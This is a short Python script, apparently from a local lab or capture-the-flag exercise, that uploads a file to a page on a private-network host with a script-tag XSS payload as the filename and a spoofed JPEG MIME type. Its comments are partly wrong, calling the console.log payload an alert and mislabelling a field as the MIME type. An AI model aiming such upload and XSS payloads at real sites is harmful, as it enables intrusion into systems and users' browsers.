#!/usr/bin/env python3

import requests

page = 'http://192.168.56.101/?page=upload'

def uploading(page):
    f = {
        'uploaded':                             # name of the file input on the web page.
            ("<script>console.log('NU VY LOHI HAHAHA')</script>",   # It contains a script tag with an alert function, which will trigger an XSS alert when executed by the browser.
                'file_contents',                # 'image/jpeg': This is the file's MIME type, specifying that it is a JPEG image
                'image/jpeg')                   # type of file
        }

    d = {
        'Upload': 'Upload'                      # This is the name of the submit button on the web page. This field is required to trigger the upload process.
        }
    return requests.post(page, files=f, data=d)


if __name__=='__main__':
    r = uploading(page)
    print(r.text)
